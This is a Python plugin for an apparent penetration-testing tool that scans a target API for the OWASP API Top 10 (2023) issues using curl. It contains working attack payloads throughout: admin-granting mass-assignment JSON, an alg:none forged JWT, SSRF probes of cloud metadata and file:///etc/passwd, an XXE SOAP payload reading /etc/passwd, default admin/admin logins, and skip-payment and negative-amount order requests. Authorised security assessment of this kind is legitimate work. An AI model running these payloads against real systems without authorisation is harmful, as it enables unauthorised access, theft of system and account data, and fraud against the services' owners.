"""
plugins/apitesting.py — Advanced API Security Testing Module

Tests every OWASP API Security Top 10 (2023) category plus extended checks:

  API1:2023  — Broken Object Level Authorization (BOLA/IDOR)
  API2:2023  — Broken Authentication
  API3:2023  — Broken Object Property Level Authorization (Mass Assignment)
  API4:2023  — Unrestricted Resource Consumption (Rate Limiting)
  API5:2023  — Broken Function Level Authorization (Privilege Escalation)
  API6:2023  — Unrestricted Access to Sensitive Business Flows
  API7:2023  — Server Side Request Forgery (SSRF)
  API8:2023  — Security Misconfiguration
  API9:2023  — Improper Inventory Management (Shadow APIs, versioning)
  API10:2023 — Unsafe Consumption of APIs (3rd party trust)

Extended:
  - JWT security testing (alg:none, weak secret, kid injection)
  - GraphQL introspection + batch query DoS
  - REST verb tampering + hidden endpoints
  - API key exposure in responses
  - SOAP/XML injection
  - gRPC reflection
  - WebSocket endpoint detection
  - Swagger/OpenAPI schema extraction and analysis
  - Mass assignment / parameter pollution
  - Business logic bypass (negative values, state manipulation)
"""

import re
import json
import base64
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.banner import print_status, print_finding, print_table, print_section, C
from utils.shell import run_cmd

# ── Common API endpoint patterns ──────────────────────────────────────────────
API_BASE_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/v1", "/v2", "/v3",
    "/rest", "/restapi", "/service", "/services",
    "/graphql", "/query",
]

API_ENDPOINTS = [
    "/api/v1/users", "/api/v1/user", "/api/users",
    "/api/v1/admin", "/api/admin",
    "/api/v1/accounts", "/api/accounts",
    "/api/v1/orders", "/api/orders",
    "/api/v1/products", "/api/products",
    "/api/v1/auth", "/api/auth", "/api/login",
    "/api/v1/token", "/api/token",
    "/api/v1/keys", "/api/keys", "/api/apikeys",
    "/api/v1/config", "/api/config", "/api/settings",
    "/api/v1/export", "/api/export", "/api/download",
    "/api/v1/upload", "/api/upload",
    "/api/health", "/api/status", "/api/info",
    "/api/debug", "/api/test", "/api/dev",
    "/api/internal", "/api/private",
]

SENSITIVE_API_FIELDS = [
    "password", "passwd", "secret", "token", "api_key", "apikey",
    "access_token", "refresh_token", "private_key", "credit_card",
    "card_number", "cvv", "ssn", "social_security", "dob", "date_of_birth",
]

JWT_HEADER_B64 = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
JWT_EMPTY_SIG  = ""


def run(args, verbose=False):
    results  = {}
    target   = getattr(args, "target", "127.0.0.1")
    port     = int(getattr(args, "port", 80))
    scheme   = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}:{port}"

    print_status(f"API Security Testing: {base_url}", "info")
    print_status("Scope: OWASP API Top 10 (2023) + Extended Tests", "info")

    _discover_api_surface(results, base_url, verbose)
    _test_bola(results, base_url, verbose)
    _test_broken_auth(results, base_url, verbose)
    _test_mass_assignment(results, base_url, verbose)
    _test_rate_limiting(results, base_url, verbose)
    _test_function_auth(results, base_url, verbose)
    _test_ssrf(results, base_url, verbose)
    _test_security_misconfig(results, base_url, verbose)
    _test_shadow_apis(results, base_url, verbose)
    _test_jwt(results, base_url, verbose)
    _test_graphql_advanced(results, base_url, verbose)
    _test_sensitive_data_exposure(results, base_url, verbose)
    _test_business_logic(results, base_url, verbose)
    _test_websocket(results, base_url, verbose)
    _test_soap(results, base_url, verbose)
    _extract_swagger(results, base_url, verbose)

    _print_api_summary(results)
    return results


# ── API Surface Discovery ─────────────────────────────────────────────────────

def _discover_api_surface(results, base_url, verbose):
    print_section("  API SURFACE DISCOVERY  ")
    found = []

    def probe(path):
        rc, resp = run_cmd(
            f"curl -sk -m5 -o /dev/null -w '%{{http_code}} %{{content_type}} %{{size_download}}' "
            f"'{base_url}{path}' 2>/dev/null",
            timeout=8
        )
        parts = resp.strip().split()
        code  = parts[0] if parts else "0"
        ctype = parts[1] if len(parts) > 1 else ""
        size  = parts[2] if len(parts) > 2 else "0"
        if code not in ("404", "000", ""):
            return (path, code, ctype[:40], size)
        return None

    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = [ex.submit(probe, p) for p in API_ENDPOINTS]
        for fut in as_completed(futures):
            r = fut.result()
            if r:
                found.append(r)

    found.sort(key=lambda x: x[1])
    results["api_surface"] = found

    json_endpoints = [f for f in found if "json" in f[2].lower() or f[1] == "200"]
    if found:
        print_status(f"API endpoints discovered: {len(found)} ({len(json_endpoints)} return JSON)", "info")
        print_table(["Endpoint", "HTTP", "Content-Type", "Size"], found[:20])
    else:
        print_status("No API endpoints discovered on common paths.", "miss")


# ── API1: BOLA / IDOR ─────────────────────────────────────────────────────────

def _test_bola(results, base_url, verbose):
    print_section("  API1: BROKEN OBJECT LEVEL AUTH (BOLA)  ")

    bola_findings = []
    id_endpoints  = [e for e in results.get("api_surface", [])
                     if e[1] == "200" and "json" in e[2].lower()]

    test_ids = ["1", "2", "100", "999", "0", "-1", "admin", "me", "self"]

    for ep_tuple in id_endpoints[:5]:
        ep = ep_tuple[0]
        for tid in test_ids:
            url = f"{base_url}{ep}/{tid}"
            rc, resp = run_cmd(f"curl -sk -m5 '{url}' 2>/dev/null | head -5", timeout=8)
            if resp.strip() and not resp.strip().startswith("<!"):
                try:
                    data = json.loads(resp)
                    if isinstance(data, dict) and any(
                        k in str(data).lower() for k in ["email","user","name","id","role"]
                    ):
                        bola_findings.append({
                            "url":      url,
                            "id":       tid,
                            "evidence": str(data)[:100],
                            "api":      "API1:2023"
                        })
                except Exception:
                    pass

    results["bola"] = bola_findings
    if bola_findings:
        print_finding(
            f"BOLA — Broken Object Level Auth ({len(bola_findings)} endpoint(s))",
            "\n".join(f"  [CRITICAL] {f['url']} → {f['evidence'][:60]}"
                      for f in bola_findings),
            "critical"
        )
    else:
        print_status("No obvious BOLA on discovered endpoints.", "miss")


# ── API2: Broken Authentication ───────────────────────────────────────────────

def _test_broken_auth(results, base_url, verbose):
    print_section("  API2: BROKEN AUTHENTICATION  ")
    findings = []

    # Test for endpoints accessible without auth
    protected_paths = ["/api/v1/users", "/api/admin", "/api/v1/config",
                       "/api/settings", "/api/v1/export"]
    for path in protected_paths:
        rc, code = run_cmd(
            f"curl -sk -m5 -o /dev/null -w '%{{http_code}}' '{base_url}{path}' 2>/dev/null",
            timeout=8
        )
        if code.strip() == "200":
            rc2, body = run_cmd(f"curl -sk -m5 '{base_url}{path}' 2>/dev/null | head -3", timeout=8)
            findings.append({"path": path, "note": "Accessible without auth", "body": body[:60]})

    # Test broken token validation
    broken_tokens = [
        ("empty Bearer",     "Authorization: Bearer "),
        ("null Bearer",      "Authorization: Bearer null"),
        ("Bearer 'x'",       "Authorization: Bearer x"),
        ("expired-looking",  "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjF9."),
    ]
    for label, header in broken_tokens:
        rc, code = run_cmd(
            f"curl -sk -m5 -H '{header}' -o /dev/null -w '%{{http_code}}' "
            f"'{base_url}/api/v1/users' 2>/dev/null",
            timeout=8
        )
        if code.strip() == "200":
            findings.append({"path": "/api/v1/users", "note": f"Broken token accepted: {label}",
                              "body": ""})

    results["broken_auth"] = findings
    if findings:
        print_finding(
            f"Broken Authentication — API2:2023 ({len(findings)} issue(s))",
            "\n".join(f"  [HIGH] {f['path']}: {f['note']}" for f in findings),
            "high"
        )
    else:
        print_status("No broken authentication found on tested endpoints.", "miss")


# ── API3: Mass Assignment ─────────────────────────────────────────────────────

def _test_mass_assignment(results, base_url, verbose):
    print_section("  API3: MASS ASSIGNMENT / OBJECT PROPERTY AUTH  ")
    findings = []

    # Try injecting privileged fields into registration/update endpoints
    mass_assign_payloads = [
        '{"username":"test","password":"test","role":"admin"}',
        '{"name":"test","email":"t@t.com","isAdmin":true}',
        '{"user":"test","pass":"test","admin":true,"verified":true}',
        '{"username":"test","password":"test","balance":99999}',
        '{"email":"test@test.com","role":"superuser","credits":9999}',
    ]

    update_endpoints = ["/api/v1/users/me", "/api/users/register",
                        "/api/register", "/api/v1/register", "/api/profile"]

    for ep in update_endpoints:
        for payload in mass_assign_payloads[:2]:
            rc, resp = run_cmd(
                f"curl -sk -m5 -X POST "
                f"-H 'Content-Type: application/json' "
                f"-d '{payload}' '{base_url}{ep}' 2>/dev/null",
                timeout=8
            )
            resp_low = resp.lower()
            if '"admin":true' in resp_low or '"role":"admin"' in resp_low or \
               '"isadmin":true' in resp_low or '"balance":99999' in resp_low:
                findings.append({"endpoint": ep, "payload": payload[:60],
                                  "response": resp[:100]})

    results["mass_assignment"] = findings
    if findings:
        print_finding(
            f"Mass Assignment — API3:2023 ({len(findings)} endpoint(s))",
            "\n".join(f"  [CRITICAL] {f['endpoint']}: privileged field accepted" for f in findings),
            "critical"
        )
    else:
        print_status("No mass assignment vulnerabilities detected.", "miss")


# ── API4: Rate Limiting ───────────────────────────────────────────────────────

def _test_rate_limiting(results, base_url, verbose):
    print_section("  API4: RATE LIMITING / RESOURCE CONSUMPTION  ")
    import time

    # Test login endpoint rate limiting
    login_eps = ["/api/v1/auth", "/api/auth", "/api/login", "/api/v1/login"]
    findings  = []

    for ep in login_eps:
        codes = []
        for i in range(10):
            rc, code = run_cmd(
                f"curl -sk -m3 -X POST -H 'Content-Type: application/json' "
                f"-d '{{\"username\":\"test\",\"password\":\"wrong{i}\"}}' "
                f"-o /dev/null -w '%{{http_code}}' '{base_url}{ep}' 2>/dev/null",
                timeout=5
            )
            codes.append(code.strip())
            time.sleep(0.1)

        got_429 = any(c in ("429","423","503") for c in codes)
        if not got_429 and any(c in ("200","401","403") for c in codes):
            findings.append({"endpoint": ep, "codes": codes[:5],
                              "note": "No 429 after 10 rapid requests"})

    results["rate_limiting"] = findings
    if findings:
        print_finding(
            f"Missing Rate Limiting — API4:2023 ({len(findings)} endpoint(s))",
            "\n".join(f"  [HIGH] {f['endpoint']}: {f['note']}" for f in findings),
            "high"
        )
    else:
        print_status("Rate limiting appears to be in place.", "miss")


# ── API5: Function-Level Auth ─────────────────────────────────────────────────

def _test_function_auth(results, base_url, verbose):
    print_section("  API5: BROKEN FUNCTION LEVEL AUTHORIZATION  ")
    findings = []

    # Test user-level token access to admin functions
    admin_functions = [
        ("GET",    "/api/admin/users"),
        ("GET",    "/api/v1/admin"),
        ("DELETE", "/api/v1/users/1"),
        ("POST",   "/api/admin/config"),
        ("GET",    "/api/internal/health"),
        ("PUT",    "/api/v1/admin/settings"),
    ]

    for method, path in admin_functions:
        rc, code = run_cmd(
            f"curl -sk -m5 -X {method} "
            f"-H 'Authorization: Bearer user_token_placeholder' "
            f"-o /dev/null -w '%{{http_code}}' '{base_url}{path}' 2>/dev/null",
            timeout=8
        )
        if code.strip() == "200":
            findings.append({"method": method, "path": path,
                              "note": "Admin function accessible with user-level token hint"})

    results["function_auth"] = findings
    if findings:
        print_finding(
            f"Broken Function Auth — API5:2023 ({len(findings)} endpoint(s))",
            "\n".join(f"  [HIGH] {f['method']} {f['path']}: {f['note']}" for f in findings),
            "high"
        )
    else:
        print_status("No obvious function-level auth bypass detected.", "miss")


# ── API7: SSRF ────────────────────────────────────────────────────────────────

def _test_ssrf(results, base_url, verbose):
    print_section("  API7: SSRF VIA API PARAMETERS  ")
    findings = []

    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/",
        "http://127.0.0.1/",
        "file:///etc/passwd",
    ]

    # Find URL params in discovered endpoints
    rc, body = run_cmd(f"curl -sk -m8 '{base_url}/api' 2>/dev/null", timeout=12)
    url_params = re.findall(r'"(\w*(?:url|uri|link|src|href|endpoint|target)\w*)"', body, re.IGNORECASE)

    for param in (url_params or ["url", "endpoint", "target", "source"])[:5]:
        for payload in ssrf_payloads[:2]:
            encoded = urllib.parse.quote(payload)
            rc, resp = run_cmd(
                f"curl -sk -m6 -X POST "
                f"-H 'Content-Type: application/json' "
                f"-d '{{\"{param}\":\"{payload}\"}}' "
                f"'{base_url}/api/fetch' 2>/dev/null | head -5",
                timeout=8
            )
            if any(s in resp for s in ["ami-id", "instance-id", "root:x:", "169.254"]):
                findings.append({"param": param, "payload": payload, "response": resp[:80]})

    results["api_ssrf"] = findings
    if findings:
        print_finding(
            f"API SSRF — API7:2023 ({len(findings)} finding(s))",
            "\n".join(f"  [CRITICAL] param={f['param']} → {f['response'][:60]}" for f in findings),
            "critical"
        )
    else:
        print_status("No API SSRF detected on probed endpoints.", "miss")


# ── API8: Security Misconfiguration ──────────────────────────────────────────

def _test_security_misconfig(results, base_url, verbose):
    print_section("  API8: SECURITY MISCONFIGURATION  ")
    issues = []

    rc, headers = run_cmd(f"curl -skI -m8 '{base_url}/api' 2>/dev/null", timeout=12)
    headers_low = headers.lower()

    checks = [
        ("cors",              "Access-Control-Allow-Origin: *", "CORS wildcard"),
        ("no csp",            "content-security-policy" not in headers_low, "Missing CSP"),
        ("no hsts",           "strict-transport-security" not in headers_low, "Missing HSTS"),
        ("debug header",      "x-debug" in headers_low or "x-powered-by" in headers_low, "Debug/tech disclosure"),
        ("server header",     bool(re.search(r'^server:\s*\S+', headers, re.MULTILINE|re.IGNORECASE)), "Server version disclosed"),
    ]

    for key, cond, label in checks:
        if cond:
            issues.append(label)

    # Check for stack trace in 404
    rc2, err_body = run_cmd(
        f"curl -sk -m6 '{base_url}/api/nonexistent-endpoint-phantomx' 2>/dev/null",
        timeout=8
    )
    if any(s in err_body.lower() for s in ["traceback", "stack trace", "exception", "at line"]):
        issues.append("Stack trace exposed in API error response")

    # OPTIONS showing too many methods
    rc3, opts = run_cmd(
        f"curl -sk -m6 -X OPTIONS -D - -o /dev/null '{base_url}/api' 2>/dev/null | head -10",
        timeout=8
    )
    allow_m = re.search(r'allow:\s*(.+)', opts, re.IGNORECASE)
    if allow_m and any(m in allow_m.group(1) for m in ["DELETE","PUT","TRACE"]):
        issues.append(f"Dangerous methods in Allow header: {allow_m.group(1).strip()}")

    results["api_misconfig"] = issues
    if issues:
        print_finding(
            f"API Security Misconfiguration — API8:2023 ({len(issues)} issue(s))",
            "\n".join(f"  [MEDIUM] {i}" for i in issues),
            "medium"
        )
    else:
        print_status("No obvious API misconfigurations.", "miss")


# ── API9: Shadow APIs / Versioning ────────────────────────────────────────────

def _test_shadow_apis(results, base_url, verbose):
    print_section("  API9: SHADOW APIs / IMPROPER INVENTORY  ")
    shadow = []

    old_versions = [
        "/v0", "/v1", "/v2", "/v3", "/v4",
        "/api/v0", "/api/v2", "/api/v3", "/api/beta",
        "/api/test", "/api/dev", "/api/legacy", "/api/old",
        "/api/2023", "/api/2022", "/api/2021",
        "/api/v1.0", "/api/v1.1",
    ]

    for path in old_versions:
        rc, code = run_cmd(
            f"curl -sk -m4 -o /dev/null -w '%{{http_code}}' '{base_url}{path}' 2>/dev/null",
            timeout=6
        )
        if code.strip() in ("200", "201", "301", "302"):
            shadow.append((path, code.strip()))

    results["shadow_apis"] = shadow
    if shadow:
        print_finding(
            f"Shadow/Old API Versions Active ({len(shadow)})",
            "\n".join(f"  [MEDIUM] {s[0]} → HTTP {s[1]}" for s in shadow),
            "medium"
        )
    else:
        print_status("No shadow/old API versions found.", "miss")


# ── JWT Security Testing ──────────────────────────────────────────────────────

def _test_jwt(results, base_url, verbose):
    print_section("  JWT SECURITY TESTING  ")
    findings = []

    # First, get a JWT if possible
    rc, login_resp = run_cmd(
        f"curl -sk -m8 -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"username\":\"admin\",\"password\":\"admin\"}}' "
        f"'{base_url}/api/login' 2>/dev/null",
        timeout=10
    )

    token_m = re.search(r'["\'](?:token|access_token|jwt)["\']:\s*["\']([A-Za-z0-9_\-.]+)["\']',
                        login_resp)
    jwt_token = token_m.group(1) if token_m else None

    if not jwt_token:
        # Try to extract from any auth headers
        rc2, any_resp = run_cmd(
            f"curl -sk -m8 '{base_url}/api/v1/auth' 2>/dev/null",
            timeout=8
        )
        jwt_m = re.search(r'eyJ[A-Za-z0-9_\-.]+\.eyJ[A-Za-z0-9_\-.]+\.[A-Za-z0-9_\-.]*', any_resp)
        jwt_token = jwt_m.group(0) if jwt_m else None

    if jwt_token:
        # Decode JWT header
        try:
            parts  = jwt_token.split(".")
            header = json.loads(base64.b64decode(parts[0] + "==").decode(errors="replace"))
            payload= json.loads(base64.b64decode(parts[1] + "==").decode(errors="replace"))
            findings.append(("JWT Found", f"alg={header.get('alg','?')}", "info"))

            # Test alg:none
            none_token = (
                base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
                + "." +
                parts[1] +
                "."
            )
            rc3, none_resp = run_cmd(
                f"curl -sk -m6 -H 'Authorization: Bearer {none_token}' "
                f"'{base_url}/api/v1/users/me' 2>/dev/null",
                timeout=8
            )
            if '"id"' in none_resp or '"email"' in none_resp or '"username"' in none_resp:
                findings.append(("alg:none bypass", "Server accepts unsigned JWT!", "critical"))

            # Test RS256→HS256 confusion
            if header.get("alg") == "RS256":
                findings.append(("RS256 → HS256 confusion possible",
                                  "Try signing with public key as HMAC secret", "high"))

            # Check expiry
            exp = payload.get("exp")
            if not exp:
                findings.append(("No expiry (exp claim)", "JWT never expires", "high"))

        except Exception as e:
            pass

    # Test JWT in query string (not just header)
    rc4, qs_resp = run_cmd(
        f"curl -sk -m6 -o /dev/null -w '%{{http_code}}' "
        f"'{base_url}/api/v1/users?token={jwt_token or 'test'}' 2>/dev/null",
        timeout=8
    )
    if qs_resp.strip() == "200":
        findings.append(("JWT in Query String", "Token accepted in URL — logged in plaintext", "medium"))

    results["jwt"] = findings
    if findings:
        print_finding(
            f"JWT Security Issues ({len(findings)})",
            "\n".join(f"  [{f[2].upper()}] {f[0]}: {f[1]}" for f in findings),
            "critical" if any(f[2]=="critical" for f in findings) else "high"
        )
    else:
        print_status("No JWT tokens detected on tested endpoints.", "miss")


# ── GraphQL Advanced ──────────────────────────────────────────────────────────

def _test_graphql_advanced(results, base_url, verbose):
    print_section("  GRAPHQL ADVANCED TESTING  ")
    findings = []

    gql_endpoints = ["/graphql", "/api/graphql", "/gql", "/v1/graphql"]

    for ep in gql_endpoints:
        # Introspection
        rc, resp = run_cmd(
            f"curl -sk -m8 -X POST -H 'Content-Type: application/json' "
            f"-d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' "
            f"'{base_url}{ep}' 2>/dev/null",
            timeout=10
        )
        if '"__schema"' in resp:
            type_count = len(re.findall(r'"name":', resp))
            findings.append({"endpoint": ep, "type": "Introspection enabled",
                              "detail": f"{type_count} types exposed", "severity": "medium"})

            # Batch query DoS potential
            batch_payload = '[' + ','.join(['{"query":"{__typename}"}'] * 10) + ']'
            rc2, batch_resp = run_cmd(
                f"curl -sk -m8 -X POST -H 'Content-Type: application/json' "
                f"-d '{batch_payload}' '{base_url}{ep}' 2>/dev/null | head -3",
                timeout=10
            )
            if batch_resp.strip().startswith("["):
                findings.append({"endpoint": ep, "type": "Batch query supported",
                                  "detail": "Potential DoS via query batching", "severity": "medium"})

            # Alias-based DoS
            alias_query = '{"query":"{' + ' '.join([f'a{i}:__typename' for i in range(100)]) + '}"}'
            rc3, alias_resp = run_cmd(
                f"curl -sk -m8 -X POST -H 'Content-Type: application/json' "
                f"-d '{alias_query}' '{base_url}{ep}' 2>/dev/null | wc -c",
                timeout=10
            )
            if int(alias_resp.strip() or "0") > 1000:
                findings.append({"endpoint": ep, "type": "Alias amplification",
                                  "detail": "100 aliases returned large response", "severity": "medium"})

    results["graphql_advanced"] = findings
    if findings:
        print_finding(
            f"GraphQL Issues ({len(findings)})",
            "\n".join(f"  [{f['severity'].upper()}] {f['endpoint']}: {f['type']} — {f['detail']}"
                      for f in findings),
            "medium"
        )
    else:
        print_status("No GraphQL endpoints with issues found.", "miss")


# ── Sensitive Data Exposure ───────────────────────────────────────────────────

def _test_sensitive_data_exposure(results, base_url, verbose):
    print_section("  SENSITIVE DATA IN API RESPONSES  ")
    findings = []

    for ep_tuple in results.get("api_surface", [])[:10]:
        ep = ep_tuple[0]
        rc, resp = run_cmd(f"curl -sk -m6 '{base_url}{ep}' 2>/dev/null", timeout=8)
        resp_low = resp.lower()
        for field in SENSITIVE_API_FIELDS:
            if f'"{field}"' in resp_low or f"'{field}'" in resp_low:
                findings.append({"endpoint": ep, "field": field})
                break

    results["sensitive_exposure"] = findings
    if findings:
        print_finding(
            f"Sensitive Data in API Responses ({len(findings)} endpoint(s))",
            "\n".join(f"  [HIGH] {f['endpoint']}: field '{f['field']}' visible" for f in findings),
            "high"
        )
    else:
        print_status("No sensitive field names visible in API responses.", "miss")


# ── Business Logic Testing ────────────────────────────────────────────────────

def _test_business_logic(results, base_url, verbose):
    print_section("  BUSINESS LOGIC BYPASS  ")
    findings = []

    # Test negative values
    negative_payloads = [
        '{"amount":-100,"currency":"USD"}',
        '{"quantity":-1,"product_id":1}',
        '{"price":-999.99}',
        '{"credits":-9999}',
    ]
    order_eps = ["/api/orders", "/api/v1/orders", "/api/purchase", "/api/v1/purchase"]

    for ep in order_eps:
        for payload in negative_payloads[:2]:
            rc, resp = run_cmd(
                f"curl -sk -m6 -X POST -H 'Content-Type: application/json' "
                f"-d '{payload}' '{base_url}{ep}' 2>/dev/null | head -3",
                timeout=8
            )
            if '"success"' in resp.lower() or '"created"' in resp.lower() or \
               re.search(r'HTTP/\d 20\d', resp):
                findings.append({"endpoint": ep, "payload": payload, "type": "Negative value accepted"})

    # Test state manipulation (skip payment)
    state_payloads = [
        '{"status":"completed","payment_status":"paid"}',
        '{"order_status":"shipped","paid":true}',
    ]
    for ep in order_eps:
        for payload in state_payloads[:1]:
            rc, resp = run_cmd(
                f"curl -sk -m6 -X POST -H 'Content-Type: application/json' "
                f"-d '{payload}' '{base_url}{ep}' 2>/dev/null | head -3",
                timeout=8
            )
            if '"success"' in resp.lower() or '"id"' in resp.lower():
                findings.append({"endpoint": ep, "payload": payload,
                                  "type": "State manipulation accepted"})

    results["business_logic"] = findings
    if findings:
        print_finding(
            f"Business Logic Bypass ({len(findings)} issue(s))",
            "\n".join(f"  [HIGH] {f['endpoint']}: {f['type']}" for f in findings),
            "high"
        )
    else:
        print_status("No business logic bypass detected.", "miss")


# ── WebSocket Detection ───────────────────────────────────────────────────────

def _test_websocket(results, base_url, verbose):
    print_section("  WEBSOCKET ENDPOINT DETECTION  ")

    ws_paths = ["/ws", "/websocket", "/socket", "/socket.io", "/signalr", "/hub"]
    found = []

    for path in ws_paths:
        # Send WebSocket upgrade request
        rc, resp = run_cmd(
            f"curl -sk -m5 "
            f"-H 'Upgrade: websocket' "
            f"-H 'Connection: Upgrade' "
            f"-H 'Sec-WebSocket-Version: 13' "
            f"-H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' "
            f"-o /dev/null -w '%{{http_code}}' "
            f"'{base_url}{path}' 2>/dev/null",
            timeout=8
        )
        if resp.strip() in ("101", "200"):
            found.append((path, resp.strip()))

    results["websockets"] = found
    if found:
        print_finding(
            f"WebSocket Endpoints ({len(found)})",
            "\n".join(f"  [MEDIUM] {base_url}{f[0]} → HTTP {f[1]}" for f in found),
            "medium"
        )
        print(f"  {C.DIM}  Test with: wscat -c ws://{base_url.split('//')[1]}/ws{C.RESET}\n")
    else:
        print_status("No WebSocket endpoints detected.", "miss")


# ── SOAP Testing ──────────────────────────────────────────────────────────────

def _test_soap(results, base_url, verbose):
    print_section("  SOAP / XML API TESTING  ")

    soap_paths = ["/soap", "/wsdl", "/service", "/ws", "/api/soap"]
    findings   = []

    xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><test>&xxe;</test></soapenv:Body>
</soapenv:Envelope>'''

    for path in soap_paths:
        rc, code = run_cmd(
            f"curl -sk -m5 -o /dev/null -w '%{{http_code}}' '{base_url}{path}?wsdl' 2>/dev/null",
            timeout=6
        )
        if code.strip() == "200":
            findings.append({"path": path + "?wsdl", "type": "WSDL exposed", "severity": "medium"})

            # Test XXE
            rc2, xxe_resp = run_cmd(
                f"curl -sk -m8 -X POST "
                f"-H 'Content-Type: text/xml; charset=utf-8' "
                f"-H 'SOAPAction: test' "
                f"-d '{xxe_payload}' '{base_url}{path}' 2>/dev/null",
                timeout=10
            )
            if "root:x:" in xxe_resp or "daemon:" in xxe_resp:
                findings.append({"path": path, "type": "XXE in SOAP", "severity": "critical"})

    results["soap"] = findings
    if findings:
        print_finding(
            f"SOAP/XML Issues ({len(findings)})",
            "\n".join(f"  [{f['severity'].upper()}] {base_url}{f['path']}: {f['type']}"
                      for f in findings),
            "critical" if any(f["severity"] == "critical" for f in findings) else "medium"
        )
    else:
        print_status("No SOAP/XML endpoints detected.", "miss")


# ── Swagger/OpenAPI Extraction ────────────────────────────────────────────────

def _extract_swagger(results, base_url, verbose):
    print_section("  SWAGGER / OPENAPI SCHEMA EXTRACTION  ")

    swagger_paths = [
        "/swagger.json", "/swagger-ui.html", "/openapi.json",
        "/api-docs", "/v2/api-docs", "/v3/api-docs",
        "/api/swagger.json", "/swagger/v1/swagger.json",
    ]
    found_schemas = []

    for path in swagger_paths:
        rc, code = run_cmd(
            f"curl -sk -m5 -o /dev/null -w '%{{http_code}}' '{base_url}{path}' 2>/dev/null",
            timeout=6
        )
        if code.strip() == "200":
            rc2, schema = run_cmd(f"curl -sk -m10 '{base_url}{path}' 2>/dev/null", timeout=12)
            endpoints = re.findall(r'"(/[^"]+)":\s*\{', schema)
            found_schemas.append({"path": path, "endpoints_found": len(endpoints),
                                   "sample": endpoints[:5]})

    results["swagger"] = found_schemas
    if found_schemas:
        for s in found_schemas:
            print_finding(
                f"API Schema Exposed: {base_url}{s['path']}",
                f"  {s['endpoints_found']} endpoint(s) documented\n"
                f"  Sample: {', '.join(s['sample'][:3])}",
                "medium"
            )
    else:
        print_status("No API documentation schemas exposed.", "miss")


# ── Summary ───────────────────────────────────────────────────────────────────

def _print_api_summary(results):
    critical_keys = ["bola", "mass_assignment", "api_ssrf", "jwt", "soap"]
    high_keys     = ["broken_auth", "function_auth", "sensitive_exposure", "business_logic"]
    medium_keys   = ["rate_limiting", "api_misconfig", "shadow_apis", "graphql_advanced",
                     "websockets", "swagger"]

    critical = sum(len(results.get(k, [])) for k in critical_keys)
    high     = sum(len(results.get(k, [])) for k in high_keys)
    medium   = sum(len(results.get(k, [])) for k in medium_keys)

    print(f"\n  {'─'*60}")
    print(f"  {C.BOLD}API SECURITY TEST SUMMARY (OWASP API Top 10: 2023){C.RESET}")
    print(f"  {'─'*60}")
    print(f"  {C.RED+C.BOLD}CRITICAL : {critical}{C.RESET}")
    print(f"  {C.RED}HIGH     : {high}{C.RESET}")
    print(f"  {C.YELLOW}MEDIUM   : {medium}{C.RESET}")
    print(f"  TOTAL    : {critical+high+medium}")
    print(f"  {'─'*60}\n")
